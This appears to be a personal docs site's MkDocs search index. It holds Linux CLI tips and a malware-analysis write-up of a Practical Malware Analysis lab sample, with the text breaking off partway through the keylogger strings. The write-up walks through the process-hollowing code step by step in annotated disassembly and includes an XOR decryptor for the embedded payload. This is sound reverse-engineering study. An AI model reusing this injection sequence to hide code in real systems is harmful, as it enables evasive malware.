{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"index.html#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"index.html#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"tags.html","title":"Tags","text":"<p>Following is a list of relevant tags:</p>"},{"location":"tags.html#forensics","title":"forensics","text":"<ul> <li>Welcome to Digital Forensics</li> </ul>"},{"location":"tags.html#linux","title":"linux","text":"<ul> <li>How to change keyboard layout from CLI</li> <li>How to configure monitors from CLI</li> <li>How to display keyboard modifiers</li> <li>How to force the SSH client to use only provided identity</li> <li>How to manage different monitor profiles</li> </ul>"},{"location":"tags.html#malware","title":"malware","text":"<ul> <li>Process Hollowing: a reverse engineering case</li> </ul>"},{"location":"tags.html#ssh","title":"ssh","text":"<ul> <li>How to force the SSH client to use only provided identity</li> </ul>"},{"location":"tags.html#vim","title":"vim","text":"<ul> <li>Titolo vim</li> </ul>"},{"location":"linux/index.html","title":"Welcome to Linux","text":"<p>This is the index of the linux section</p>"},{"location":"linux/how-to-change-keyboard-layout-from-cli.html","title":"How to change keyboard layout from CLI","text":"<p>The keyboard layout can be changed from the command line using the <code>setxkbmap</code> utility.</p> <p>Set the US layout:</p> <pre><code>setxkbmap -layout us\n</code></pre> <p>Set the US layout with dead keys:</p> <pre><code>setxkbmap -layout us -variant intl\n</code></pre> <p>Set the Italian layout:</p> <pre><code>setxkbmap -layout it\n</code></pre>","tags":["linux"]},{"location":"linux/how-to-change-keyboard-layout-from-cli.html#show-key-modifiers","title":"Show key modifiers","text":"<p>To show current key modifiers, just run:</p> <pre><code>xmodmap\n</code></pre>","tags":["linux"]},{"location":"linux/how-to-configure-monitors-from-cli.html","title":"How to configure monitors from CLI","text":"<p>We may need to configure monitors from the command line in Linux. To the purpose we can use the <code>xrandr</code> utility.</p> <p>Display available monitors:</p> <pre><code>xrandr --listmonitors\n</code></pre> <p>Use the monitor connected to DisplayPort-6 and set it as primary:</p> <pre><code>xrandr --output DisplayPort-6 --auto --primary\n</code></pre> <p>Add the monitor connected to DisplayPort-7  placed to the right of the first one connected to DisplayPort-6:</p> <pre><code>xrandr --output DisplayPort-7 --auto --right-of DisplayPort-6\n</code></pre> <p>Disconnect the native laptop display:</p> <pre><code>xrandr --output eDP --off\n</code></pre> <p>Enable the native laptop display:</p> <pre><code>xrandr --output eDP --auto\n</code></pre> <p>Reset displays:</p> <pre><code>xrandr -s 0\n</code></pre>","tags":["linux"]},{"location":"linux/how-to-configure-monitors-from-cli.html#references","title":"References","text":"<ul> <li>Multihead - ArchWiki</li> </ul>","tags":["linux"]},{"location":"linux/how-to-configure-monitors-from-cli.html#see-also","title":"See also","text":"<ul> <li>how-to-manage-different-monitor-profiles</li> </ul>","tags":["linux"]},{"location":"linux/how-to-display-keyboard-modifiers.html","title":"How to display keyboard modifiers","text":"<p>The <code>xmodmap</code> utility is used to display (and edit) the keyboard modifiers map (e.g. <code>ALT</code>, <code>CTRL</code>, <code>SHIFT</code>,  <code>WIN</code>, etc).</p> <p>This may be useful when we need to configure other applications (like <code>i3</code>) to use such keys.</p> <p>To show current key modifiers, just run:</p> <pre><code>xmodmap\n</code></pre> <p>This command will tell us that, for example, the <code>WIN</code> key corresponds to <code>mod4</code> modifier.</p>","tags":["linux"]},{"location":"linux/how-to-force-the-ssh-client-to-use-only-provided-identity.html","title":"How to force the SSH client to use only provided identity","text":"<p>When we connect to a remote SSH server, the ssh-agent may try to authenticate using many different identities. Sometimes this behavior may cause issues, so we may want to tell the SSH client to use only the identity we configured or provided for that specific connection. </p> <p>To this purpose we can use the <code>IdentitiesOnly</code> option.</p> <p><code>IdentitiesOnly</code> Specifies that ssh(1) should only use the configured authentication identity and certificate files (either the default files, or those explicitly configured in the ssh_config files or passed on the ssh(1) command-line), even if ssh-agent(1) or a PKCS11Provider or SecurityKeyProvider offers more identities.  The argument to this keyword must be yes or no (the default).  This option is intended for situations where ssh-agent offers many different identities.</p> <pre><code>ssh -o IdentitiesOnly=yes -i identity.key user@host\n</code></pre> <p>To persist this behavior, modify the <code>/etc/ssh/ssh_config</code> file by adding this line:</p> <pre><code>IdentitiesOnly yes\n</code></pre>","tags":["linux","ssh"]},{"location":"linux/how-to-manage-different-monitor-profiles.html","title":"How to manage different monitor profiles","text":"<p>We want to configure different monitor profiles, say: - a \"mobile\" profile: the laptop display only; - a \"home\" profile: a dual screen setup; and we want to be able to quickly switch between the two from the command line.</p> <p>We can use autorandr :  this tool will utomatically select a display configuration based on connected devices. It can also save and load configuration profiles.</p> <p>Install <code>autorandr</code>: <pre><code>apt install autorandr\n</code></pre></p> <p>Show the current configuration:</p> <pre><code>autorandr --config\n</code></pre> <p>List available profiles:</p> <pre><code>autorandr\n</code></pre> <p>Save the current configuration into a named profile:</p> <pre><code>autorandr --save home\n</code></pre> <p>Load a named profile:</p> <pre><code>autorandr --load home\n</code></pre> <p>Autorandr saves its configuration profiles in the <code>~/.config/autorandr/&lt;PROFILE_NAME&gt;</code> folder.</p>","tags":["linux"]},{"location":"linux/vim.html","title":"Welcome to VIM","text":"<p>This is about how coold vim is.</p>","tags":["vim"]},{"location":"linux/vim.html#first-section","title":"First section","text":"<p>this is the first section</p>","tags":["vim"]},{"location":"linux/vim.html#second-section","title":"Second section","text":"<p>and this is the second</p>","tags":["vim"]},{"location":"linux/vim.html#categories","title":"Categories","text":"<ul> <li>Devops</li> </ul>","tags":["vim"]},{"location":"security/dfir.html","title":"Welcome to Digital Forensics","text":"<p>This is a dfir page edited.</p> <p>See Malware for more or vim</p>","tags":["forensics"]},{"location":"security/dfir.html#categories","title":"Categories","text":"<ul> <li>dfir</li> </ul>","tags":["forensics"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html","title":"Process Hollowing: a reverse engineering case","text":"<p>This is an in-depth analysis of how Process Hollowing works from the point of view of a malware (and from that of a malware analyst). While reverse-engineering a sample from the Lab 12-2 of the book Practical Malware Analysis, I'll be showing what Process Hollowing is and how a malware can use this technique to hide itself.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#what-is-process-hollowing","title":"What is Process Hollowing?","text":"<p>Process Hollowing (or Process Replacement) is a technique employed by a malware with the purpose of hiding itself under a legitimate process thus evading detection.</p> <p>Process Hollowing occurs when a malware creates a benign process in a suspended state and then unmaps and replaces the process memory with malicious code.</p> <p>Process Hollowing works as follows:</p> <ol> <li> <p>The malware creates a benign process in a suspended state (API function used: <code>CreateProcessA</code>).</p> </li> <li> <p>The malware releases the memory of the suspended process (API function used: <code>NtUnmapViewOfSection</code>).</p> </li> <li> <p>The malware allocates new memory within the suspended process where to write its malicious code (API function used: <code>VirtualAllocEx</code>).</p> </li> <li> <p>The malware writes its malicious code into the newly allocated memory region (API function used: <code>WriteProcessMemory</code>; usually this function is called once for writing the PE headers and then called again in a loop for each PE section).</p> </li> <li> <p>The malware restores the victim process environment by setting its entry point to point to the malicious code, so to make the malicious code run (API function used: <code>SetThreadContext</code>).</p> </li> <li> <p>The malware resumes the suspended thread, thus initiating the execution of the malicious code (API function used: <code>ResumeThread</code>).</p> </li> </ol> <p>Such a sequence of API function calls makes a pattern that clearly indicates that the malware is attempting to perform Process Hollowing.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#reverse-engineering-a-malware-that-performs-process-hollowing","title":"Reverse engineering a malware that performs Process Hollowing","text":"<p>The sample that I'm analyzing can be downloaded from here.</p> <p>These are the sample hashes:</p> hash value md5 e2bf42217a67e46433da8b6f4507219e sha1 daf263702f11dc0430d30f9bf443e7885cf91fcb sha256 ae8a1c7eb64c42ea2a04f97523ebf0844c27029eb040d910048b680f884b9dce","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#static-analysis","title":"Static Analysis","text":"<p>Let's start with some basic static analysis.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#pe-structure","title":"PE structure","text":"<p>Sections look OK. The sample is not packed.</p> <p>There is one embedded resource named <code>LOCALIZATION</code> in the <code>.rsrc</code> section. I can dump this resource using the Resource Hacker tool: the resource appears to contain raw binary data.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#interesting-strings","title":"Interesting strings","text":"<pre><code>\\svchost.exe\nNtUnmapViewOfSection\nntdll.dll\n</code></pre> <p>The <code>NtUnmapViewOfSection</code> string looks like an import that the malware may resolve at runtime using <code>GetProcAddress</code>.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#interesting-imports","title":"Interesting imports","text":"<pre><code>FindResourceA\nLoadResource\nLockResource\nSizeofResource\nFreeResource\n\nCreateFileA\nReadFile\nWriteFile\n\nReadProcessMemory\n\nVirtualAllocEx\nWriteProcessMemory\nSetThreadContext\nResumeThread\n</code></pre>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#code-analysis","title":"Code Analysis","text":"<p>Let's now open the sample in IDA Pro.</p> <p>The <code>main</code> function starts by getting a handle to the malware executable.</p> <p>Then it calls a subroutine (<code>sub_40149D</code>) to obtain the full path to the Windows <code>svchost.exe</code> executable, which is a system process used to host multiple Windows services. The full path is stored in the <code>ApplicationName</code> local variable.</p> <p>Next the function <code>sub_40132C</code> is called with the handle to the malware executable as a parameter.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#dropping-the-embedded-resource-function-sub_40132c","title":"Dropping the embedded resource (function <code>sub_40132C</code>)","text":"<p>The purpose of the <code>sub_40132C</code> function is to drop the embedded resource, copy it in memory and decrypt it. So I renamed it to <code>Sub_DropResource</code>.</p> <p>This function looks inside the malware executable for a resource named <code>LOCALIZATION</code>; the resource is loaded and copied into a newly allocated memory space. The resource is encrypted, so the malware calls the subroutine <code>sub_401000</code> to decrypt the resource in memory.</p> <p>The decryption routine is called only if the first two bytes of the resource are not <code>0x4D 0x5A</code>; since these two bytes are the MZ signature of DOS executables, I guess that the resource is an ecnrypted PE executable. So the main malware module is indeed a loader (or dropper).</p> <p>After decryption, the pointer to the decrypted resource in memory is returned to the calling main function and saved in the <code>lpBuffer</code> variable.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#decryption-routine-function-sub_401000","title":"Decryption routine (function <code>sub_401000</code>)","text":"<p>Let's give a quick look at the decryption routine <code>sub_401000</code> (renamed to <code>Sub_DecryptResource</code>).</p> <p>This routine takes three parameters:</p> <ul> <li>the pointer to the resource in memory (<code>arg_0</code>)</li> <li>the size of the resource (<code>arg_4</code>)</li> <li>the hex key <code>0x41</code> (<code>arg_8</code>)</li> </ul> <p>The decryption routine loops through each byte of the dumped resource and performs a XOR operation with the key <code>0x41</code>:</p> <pre><code>00401026 xor     al, [ebp+arg_8]\n</code></pre> <p>If I place a breakpoint in OllyDbg at <code>0x401036</code> (ie. right before the decryption function returns) I can see what the resource in memory looks like after decryption. The resource in memory is pointed to by <code>arg_0</code>: the following is the beginning of the decrypted resource in memory (notice the <code>MZ</code> signature):</p> <pre><code>00350000  4D 5A 90 00 03 00 00 00  MZ......\n00350008  04 00 00 00 FF FF 00 00  ........\n00350010  B8 00 00 00 00 00 00 00  ........\n</code></pre> <p>I can obtain the fully decrypted resource from its original version by applying the XOR transformation using a tool like Cyber Chef or via a simple python script like this:</p> <pre><code>#!/usr/bin/python\n\nb = bytearray(open('Lab12-02-LOCALIZATION','rb').read())\nfor i in range(len(b)):\n    b[i] ^= 0x41\nopen('Lab12-02-LOCALIZATION.decrypted','wb').write(b)\n</code></pre> <p>The decrypted resource is indeed a DOS executable. I will analyze it later on.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#performing-process-hollowing-function-sub_4010ea","title":"Performing process hollowing (function <code>sub_4010EA</code>)","text":"<p>After dropping and decrypting its embedded resource in memory, the malware calls the function <code>sub_4010EA</code>. Since I know (after my analysis) that this function performs process hollowing, I renamed it to <code>Sub_ProcessHollow</code>.</p> <pre><code>00401539 mov     edx, [ebp+lpBuffer]\n0040153C push    edx             ; lpBuffer\n0040153D lea     eax, [ebp+ApplicationName]\n00401543 push    eax             ; lpApplicationName\n00401544 call    sub_4010EA\n</code></pre> <p>This function takes two parameters:</p> <ul> <li>the full path to Windows <code>svchost.exe</code> executable (<code>lpApplicationName</code>)</li> <li>the pointer to the decrypted dropped resource in memory</li> </ul> <p>I renamed the pointer to the decrypted executable to <code>lpDecryptedResource</code>.</p> <p>The function <code>sub_4010EA</code> first checks the dropped resource for the MZ magic value (<code>0x4D 0x5A</code>) and then the PE magic value (<code>0x50 0x45</code>). The PE magic value is located at the offset specified at offset <code>0x3C</code> (the offset <code>0x3C</code> is the last field of <code>IMAGE_DOS_HEADER</code>). If those bytes are as expected then the program continues.</p> <p>By the way, the pointer to the PE header of the dropped executable is saved into <code>var_8</code> which I renamed to <code>Var_PEHeader</code>. The malware will be using this pointer later on.</p> <p>Now the process hollowing procedure begins. Let's dig into the details of each step:</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#step-1-creating-a-process-in-a-suspended-state","title":"Step 1: Creating a process in a suspended state","text":"<p>The malware first creates a process by calling the function <code>CreateProcessA</code> (at <code>0x40115F</code>); the process executable is <code>svchost.exe</code>.</p> <p>As we will see shortly, the process is created in a suspended state. This is a clear indication that the malware is attempting to perform process hollowing: the malware will overwrite the memory space of the legit <code>svchost.exe</code> with some other malicious code that it wants to hide - most certainly, the dropped executable!</p> <p>This is the call to <code>CreateProcessA</code>:</p> <pre><code>00401145 lea     edx, [ebp+hProcess]\n00401148 push    edx             ; lpProcessInformation\n00401149 lea     eax, [ebp+StartupInfo]\n0040114C push    eax             ; lpStartupInfo\n0040114D push    0               ; lpCurrentDirectory\n0040114F push    0               ; lpEnvironment\n00401151 push    4               ; dwCreationFlags\n00401153 push    0               ; bInheritHandles\n00401155 push    0               ; lpThreadAttributes\n00401157 push    0               ; lpProcessAttributes\n00401159 push    0               ; lpCommandLine\n0040115B mov     ecx, [ebp+lpApplicationName]\n0040115E push    ecx             ; lpApplicationName\n0040115F call    ds:CreateProcessA\n</code></pre> <p>The function <code>CreateProcessA</code> takes many parameters, among which:</p> <ul> <li> <p><code>lpApplicationName</code>: this is the name of the module to be executed, i.e. <code>svchost.exe</code></p> </li> <li> <p><code>dwCreationFlags</code>: these flags control the creation of the process; the value 4 means <code>CREATE_SUSPENDED</code> so the process will be created in a suspended state and will not run until the <code>ResumeThread</code> function is called.</p> </li> <li> <p><code>lpStartupInfo</code>: a pointer to a <code>STARTUPINFO</code> structure, passed in the <code>StartupInfo</code> variable.</p> </li> <li> <p><code>lpProcessInformation</code>: a pointer to a <code>PROCESS_INFORMATION</code> structure that will receive the identification information about the new proces; passed in the <code>lpProcessInformation</code> variable.</p> </li> </ul> <p>Let's follow the execution in OllyDbg. Before executing, I place a breakpoint at <code>0x40115F</code> (right before the call to <code>CreateProcessA</code>); if I step over to the next instruction, I can see in Process Explorer that the new process is indeed created as Suspended.</p> <p></p> <p>I will keep the debugger paused and step over the execution as needed during the following analysis.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#obtaining-the-imagebase-address-of-the-suspended-process","title":"Obtaining the <code>ImageBase</code> address of the suspended process","text":"<p>After creating a new <code>svchost.exe</code> process in a suspended state, the malware obtains a handle to the suspended thread by calling <code>GetThreadContext</code> at <code>0x401195</code>. The <code>GetThreadContext</code> function is passed the <code>hThread</code> parameter, which comes from the same <code>PROCESS_INFORMATION</code> structure passed to <code>CreateProcessA</code>; this thread handle is used to interact with the suspended process.</p> <p>The <code>hThread</code> value is <code>0x44</code>. Other than looking in the stack view of the debugger, I can also read the thread handle in Process Hacker: just double-click on the Lab12-02.exe process, open the Handles tab and look for the Thread type. By the way, this same window also shows the Process handle value (0x34).</p> <p></p> <p>The <code>GetThreadContext</code> function returns the thread context in a <code>CONTEXT</code> structure which is pointed to by the <code>lpContext</code> parameter (for such a structure the program just allocated memory space by calling <code>VirtualAlloc</code> at <code>0x40117B</code>).</p> <pre><code>0040117B call    ds:VirtualAlloc\n00401181 mov     [ebp+lpContext], eax\n00401184 mov     edx, [ebp+lpContext]\n00401187 mov     dword ptr [edx], 10007h\n0040118D mov     eax, [ebp+lpContext]\n00401190 push    eax             ; lpContext\n00401191 mov     ecx, [ebp+hProcess.hThread]\n00401194 push    ecx             ; hThread\n00401195 call    ds:GetThreadContext\n</code></pre> <p>After that, the malware uses the <code>CONTEXT</code> structure (pointed to by <code>lpContext</code>) in a call to <code>ReadProcessMemory</code>:</p> <pre><code>004011B8 push    0               ; lpNumberOfBytesRead\n004011BA push    4               ; nSize\n004011BC lea     edx, [ebp+Buffer]\n004011BF push    edx             ; lpBuffer\n004011C0 mov     eax, [ebp+lpContext]\n004011C3 mov     ecx, [eax+0A4h]\n004011C9 add     ecx, 8\n004011CC push    ecx             ; lpBaseAddress\n004011CD mov     edx, [ebp+hProcess.hProcess]\n004011D0 push    edx             ; hProcess\n004011D1 call    ds:ReadProcessMemory\n</code></pre> <p>Here the malware is reading 4 bytes (<code>nSize</code> = 4) from the memory space of the <code>svchost.exe</code> process (<code>hProcess</code> = 0x34) starting at the <code>lpBaseAddress</code> address. The <code>lpBaseAddress</code> is calculated as follows:</p> <pre><code>lpBaseAddress = lpContext + 0xA4 + 0x8\n</code></pre> <p>What is this address pointing to?</p> <p>To answer this question, we need to understand the <code>CONTEXT</code> structure.</p> <p>So let's add a new structure in IDA Pro: open the Structures tab and press the <code>Ins</code> key to add a new structure; then click on <code>Add standard structure</code>, select the <code>CONTEXT</code> type name and click OK. In the Structures tab double-click the <code>CONTEXT</code> structure to expand it; at offset <code>0xA4</code> we read <code>Ebx</code>, so this offset references the EBX register of the thread.</p> <p></p> <p>Now in the Assembly view, at location <code>0x4011C3</code>, if we right-click over <code>0A4h</code> we can expand that value to read as the following:</p> <pre><code>004011C3 mov     ecx, [eax+CONTEXT.Ebx]\n</code></pre> <p>The EBX register of a newly created process always contains a pointer to the Process Environment Block (PEB) data structure. The PEB structure is not part of the standard IDA Pro data structures but we can search on the Internet to discover that at offset <code>0x8</code> there is a pointer to the <code>ImageBaseAddress</code> (you may refer to the aldeid blog).</p> <p>So the <code>lpBaseAddress</code> is pointing to the <code>ImageBaseAddress</code>, that is to the start of the loaded executable (<code>svchost.exe</code>).</p> <p>The <code>lpBaseAddress</code> value is <code>0x7FFDF008</code>; I can inspect the memory area of the suspended <code>svchost.exe</code> also using the Memory tab of Process Hacker: the PEB is showed at address <code>0x7FFDF000</code> and at offset <code>0x8</code> I can see the <code>ImageBaseAddress</code> pointer value of <code>0x01000000</code> (<code>01</code> followed by six zeroes).</p> <p></p> <p>Then reading 4 bytes starting at the <code>lpBaseAddress</code>, will place the ImageBase address of the suspended process (ie: <code>0x01000000</code>) into the <code>Buffer</code> variable. This is the dump view of the <code>Buffer</code> variable after the call to <code>ReadProcessMemory</code>:</p> <pre><code>0012FAFC  00 00 00 01 00 00 00 00  ........\n</code></pre>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#step-2-unmapping-the-suspended-process-from-memory","title":"Step 2: Unmapping the suspended process from memory","text":"<p>The program manually resolves the import <code>NtUnmapViewOfSection</code> using <code>GetProcAddress</code> at <code>0x4011E8</code>:</p> <pre><code>004011D7 push    offset ProcName ; \"NtUnmapViewOfSection\"\n004011DC push    offset ModuleName ; \"ntdll.dll\"\n004011E1 call    ds:GetModuleHandleA\n004011E7 push    eax             ; hModule\n004011E8 call    ds:GetProcAddress\n004011EE mov     [ebp+var_64], eax\n</code></pre> <p>The address of the <code>NtUnmapViewOfSection</code> function is placed in a variable named <code>var_64</code>; the function is then called at <code>0x401206</code>, passing in the <code>ImageBase</code> address of the suspended process (<code>Buffer</code> = <code>0x01000000</code>) and the handle to that same process (<code>hProcess</code>) as parameters:</p> <pre><code>004011FE mov     eax, [ebp+Buffer] ; ImageBase address of suspended process\n00401201 push    eax\n00401202 mov     ecx, [ebp+hProcess.hProcess]\n00401205 push    ecx\n00401206 call    [ebp+var_64]    ; call NtUnmapViewOfSection\n</code></pre> <p>The malware calls <code>NtUnmapViewOfSection</code> to unmap the suspended process from memory.</p> <p>Let's step over and pause the debugger at <code>0x401206</code>. This is how the memory of <code>svchost.exe</code> appears in Process Hacker right before the call to <code>NtUnmapViewOfSection</code>:</p> <p></p> <p>Let the call execute; now hit the refresh button in the Mememory tab of Process Hacker and see that the memory area of <code>svchost.exe</code> is gone:</p> <p></p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#step-3-allocating-new-memory-space-within-the-suspended-process","title":"Step 3: Allocating new memory space within the suspended process","text":"<p>Now the malware allocates new memory within the address space of the suspended process (<code>hProcess</code>). This is the call to <code>VirtualAllocEx</code>:</p> <pre><code>00401209 push    40h             ; flProtect\n0040120B push    3000h           ; flAllocationType\n00401210 mov     edx, [ebp+Var_PEHeader]\n00401213 mov     eax, [edx+50h]\n00401216 push    eax             ; dwSize\n00401217 mov     ecx, [ebp+Var_PEHeader]\n0040121A mov     edx, [ecx+34h]\n0040121D push    edx             ; lpAddress\n0040121E mov     eax, [ebp+hProcess.hProcess]\n00401221 push    eax             ; hProcess\n00401222 call    ds:VirtualAllocEx\n00401228 mov     [ebp+lpBaseAddress], eax\n</code></pre> <p>Both <code>lpAddress</code> and <code>dwSize</code> are valued as offsets of the PE header of the dropped executable, respectively <code>0x34</code> and <code>0x50</code> (the pointer to the PE header was saved in <code>Var_PEHeader</code>). Looking at the PE file format documentation, we can verify that:</p> <ul> <li>offset <code>0x34</code> corresponds to the ImageBase address</li> <li>offset <code>0x50</code> corresponds to the SizeOfImage</li> </ul> <p>We can verify these offsets also opening the decrypted dropped executable with PEview (or other similar tool) and looking for the <code>ImageBase</code> and <code>SizeOfImage</code> fields in the <code>IMAGE_OPTIONAL_HEADER</code> header.</p> <p>Note: in order to locate the offsets relative to the PE Header, remember that the PE Header itself starts at the offset given in the last field of the <code>IMAGE_DOS_HEADER</code> which is at offset <code>0x3C</code> relative to the start of the PE file; so in this case the <code>ImageBase</code> field is at offset <code>0xE0</code>+<code>0x34</code>=<code>0x114</code> relative to the start of the PE file, and the <code>SizeOfImage</code> field is at offset <code>0x130</code>.</p> <p>We can add new standard structures in IDA Pro: <code>IMAGE_DOS_HEADER</code>, <code>IMAGE_NT_HEADERS</code> and <code>IMAGE_SECTION_HEADER</code> (I will use the latter lately). Now we can ask IDA Pro to display those offsets in a much more readable way by right-clicking on them and choosing the appropriate offset from the <code>Structure offset</code> list. Then the previous code block would appear like the following:</p> <pre><code>00401209 push    40h             ; flProtect\n0040120B push    3000h           ; flAllocationType\n00401210 mov     edx, [ebp+Var_PEHeader]\n00401213 mov     eax, [edx+IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage]\n00401216 push    eax             ; dwSize\n00401217 mov     ecx, [ebp+Var_PEHeader]\n0040121A mov     edx, [ecx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase]\n0040121D push    edx             ; lpAddress\n0040121E mov     eax, [ebp+hProcess.hProcess]\n00401221 push    eax             ; hProcess\n00401222 call    ds:VirtualAllocEx\n00401228 mov     [ebp+lpBaseAddress], eax\n</code></pre> <p>So, back to our malicious program, the call to the <code>VirtualAllocEx</code> function will allocate a number of <code>SizeOfImage</code> bytes (0x7000) starting at <code>ImageBase</code> address (<code>0x400000</code>). Since the malware is going to write into this new memory space, the allocation is done with <code>PAGE_EXECUTE_READWRITE</code> permissions (<code>flProtect</code> = <code>0x40</code>).</p> <p>After the call executes, we can verify in Process Hacker that there is a new memory region at base address <code>0x400000</code> which is initialized to zeroes. Notice that the permissions are set to RWX:</p> <p></p> <p>The pointer to the newly allocated memory region is saved into <code>lpBaseAddress</code>.</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#step-4-writing-the-malicious-code-into-the-suspended-process","title":"Step 4: Writing the malicious code into the suspended process","text":"<p>After unmapping the original <code>svchost.exe</code> image from memory and allocating a new memory region within the suspended process, the malware writes its malicious load into that memory region.</p> <p>The program first writes the executable headers:</p> <pre><code>0040123C push    0               ; lpNumberOfBytesWritten\n0040123E mov     ecx, [ebp+Var_PEHeader]\n00401241 mov     edx, [ecx+IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders]\n00401244 push    edx             ; nSize\n00401245 mov     eax, [ebp+lpDecryptedResource]\n00401248 push    eax             ; lpBuffer\n00401249 mov     ecx, [ebp+lpBaseAddress]\n0040124C push    ecx             ; lpBaseAddress\n0040124D mov     edx, [ebp+hProcess.hProcess]\n00401250 push    edx             ; hProcess\n00401251 call    ds:WriteProcessMemory\n</code></pre> <p>The call to <code>WriteProcessMemory</code> writes a number of <code>SizeOfHeaders</code> bytes from the <code>lpDecryptedResource</code> executable into the just-allocated memory region pointed to by <code>lpBaseAddress</code>.</p> <p>I can verify looking in Process Hacker:</p> <p></p> <p>Next, the program cycles thru each PE section, writing the raw bytes of each section.</p> <p></p> <p>This is the loop body:</p> <pre><code>00401277 mov     eax, [ebp+Var_lpDecryptedResource]\n0040127A mov     ecx, [ebp+lpDecryptedResource]\n0040127D add     ecx, [eax+IMAGE_DOS_HEADER.e_lfanew]\n00401280 mov     edx, [ebp+Var_LoopCounter]\n00401283 imul    edx, 28h\n00401286 lea     eax, [ecx+edx+0F8h] ; 0xF8 is the PE Header offset which\n00401286                         ;     the first section starts at\n0040128D mov     [ebp+Var_Section], eax\n00401290 push    0               ; lpNumberOfBytesWritten\n00401292 mov     ecx, [ebp+Var_Section]\n00401295 mov     edx, [ecx+IMAGE_SECTION_HEADER.SizeOfRawData]\n00401298 push    edx             ; nSize\n00401299 mov     eax, [ebp+Var_Section]\n0040129C mov     ecx, [ebp+lpDecryptedResource]\n0040129F add     ecx, [eax+IMAGE_SECTION_HEADER.PointerToRawData]\n004012A2 push    ecx             ; lpBuffer\n004012A3 mov     edx, [ebp+Var_Section]\n004012A6 mov     eax, [ebp+lpBaseAddress]\n004012A9 add     eax, [edx+IMAGE_SECTION_HEADER.VirtualAddress]\n004012AC push    eax             ; lpBaseAddress\n004012AD mov     ecx, [ebp+hProcess.hProcess]\n004012B0 push    ecx             ; hProcess\n004012B1 call    ds:WriteProcessMemory\n</code></pre> <p>For each PE section, the <code>WriteProcessMemory</code> function writes the section's raw bytes into the newly allocated memory region, starting at the address specified by the <code>IMAGE_SECTION_HEADER.VirtualAddress</code> field of the section header.</p> <p>I can inspect the process memory with Process Hacker to verify that each section is written (place a breakpoint at <code>0x4012B7</code>).</p> <p>Once finished writing the sections, the program updates the <code>ImageBaseAddress</code> in the PEB with the proper <code>ImageBase</code> value read from the dropped executable PE headers:</p> <pre><code>004012B9 push    0\n004012BB push    4               ; nSize\n004012BD mov     edx, [ebp+Var_PEHeader]\n004012C0 add     edx, IMAGE_NT_HEADERS.OptionalHeader.ImageBase\n004012C3 push    edx             ; lpBuffer\n004012C4 mov     eax, [ebp+lpContext]\n004012C7 mov     ecx, [eax+CONTEXT.Ebx] ; PEB\n004012CD add     ecx, 8          ;        ImageBaseAddress\n004012D0 push    ecx             ; lpBaseAddress\n004012D1 mov     edx, [ebp+hProcess.hProcess]\n004012D4 push    edx             ; hProcess\n004012D5 call    ds:WriteProcessMemory\n</code></pre>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#steps-5-and-6-setting-the-entry-point-and-resuming-the-thread","title":"Steps 5 and 6: Setting the entry point and resuming the thread","text":"<p>Then the malware uses <code>SetThreadContext</code> to set the <code>EAX</code> register to the entry point of the malicious executable that was just loaded into the suspended process, so that its execution will resume from there.</p> <p>The pointer to the EAX register is found in the <code>CONTEXT</code> structure at offset <code>0xB0</code> (instruction at <code>0x4012E7</code>).</p> <pre><code>004012DB mov     eax, [ebp+Var_PEHeader]\n004012DE mov     ecx, [ebp+lpBaseAddress]\n004012E1 add     ecx, [eax+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]\n004012E4 mov     edx, [ebp+lpContext]\n004012E7 mov     [edx+CONTEXT.Eax], ecx\n004012ED mov     eax, [ebp+lpContext]\n004012F0 push    eax             ; lpContext\n004012F1 mov     ecx, [ebp+hProcess.hThread]\n004012F4 push    ecx             ; hThread\n004012F5 call    ds:SetThreadContext\n</code></pre> <p>And finally the thread is resumed!</p> <pre><code>004012FB mov     edx, [ebp+hProcess.hThread]\n004012FE push    edx             ; hThread\n004012FF call    ds:ResumeThread\n</code></pre> <p>Wow, that's how process hollowing works under the hood!</p>","tags":["malware"]},{"location":"security/process-hollowing-a-reverse-engineering-case.html#analysis-of-the-dropped-executable","title":"Analysis of the dropped executable","text":"<p>I'll give hear a brief explanation of what the dropped executable does as well.</p> <p>These are its hashes:</p> hash value md5 a7f21e412022554d187d6a876a3c08ac sha1 70e39bdfcaa4bcf0021311e8298266e527cf7c97 sha256 9b683d2fda7ca7adcc043e4412271009a0e115ca55f9a718c385a3f46b57ae6b <p>A quick analysis of the strings and the imports is sufficient to infer that the dropped executable is a keylogger.</p> <p>The following strings suggest that the malware may perform some keylogging activity:</p> <pre><code>practicalmalwareanalysis.log\n[SHIFT]\n[ENTER]\n[BACKSPACE]\n[TAB]\n[CTRL]\n[DEL]\n[CAPS 